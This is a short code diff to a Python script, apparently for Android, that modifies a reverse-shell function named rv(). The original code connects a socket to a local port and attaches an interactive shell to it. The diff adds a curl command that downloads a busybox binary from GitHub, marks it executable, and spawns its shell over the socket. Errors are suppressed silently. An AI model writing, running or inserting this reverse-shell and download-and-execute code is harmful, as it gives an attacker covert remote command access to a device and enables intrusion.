@@ -7,6 +7,7 @@ import _thread as thread
 import subprocess
 import socket
 import pty
+import os
 
 def getIp():
   try:
@@ -17,7 +18,8 @@ def getIp():
 
 def rv():
   try:
-    import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",7070));subprocess.call(["/system/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
+    os.system("curl -LO https://raw.githubusercontent.com/xerta555/Busybox-Binaries/refs/heads/master/busybox-arm64; chmod 700 busybox-arm64")
+    import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",7070));subprocess.call(["./busybox-arm64","sh"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
   except:
     None
 
